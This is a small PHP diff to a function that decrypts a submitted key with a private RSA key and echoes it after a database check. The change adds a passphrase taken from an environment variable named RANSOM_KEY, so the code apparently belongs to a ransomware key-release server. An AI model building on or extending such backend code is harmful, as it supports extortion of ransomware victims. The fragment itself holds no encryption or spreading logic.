@@ -52,7 +52,7 @@ function returnDecrypted($dbconn,$key,$id){
 	if($tmp == 'Yes'){
 		$private_key = file_get_contents("private.pem");
 		$resStr = str_replace('-','+',$key);
-		$res = openssl_get_privatekey($private_key);		
+		$res = openssl_get_privatekey($private_key,getenv('RANSOM_KEY'));		
 		openssl_private_decrypt(base64_decode($resStr),$newsource,$res);
 		echo "$newsource";
 		update_database($id);
